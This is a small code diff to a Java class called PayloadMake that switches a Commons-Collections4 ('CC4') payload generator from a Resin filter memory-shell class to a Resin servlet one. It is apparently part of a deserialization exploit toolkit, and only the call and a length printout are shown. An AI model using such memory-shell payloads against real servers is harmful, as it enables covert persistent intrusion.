@@ -16,7 +16,7 @@ public class PayloadMake {
 
     public static void cc4() throws Exception {
         CC4Generator cc4Generator = new CC4Generator();
-        String payload = cc4Generator.make(ResinFilterExecMS.class);
+        String payload = cc4Generator.make(ResinServletExecMS.class);
         System.out.println(payload.length());
     }
 
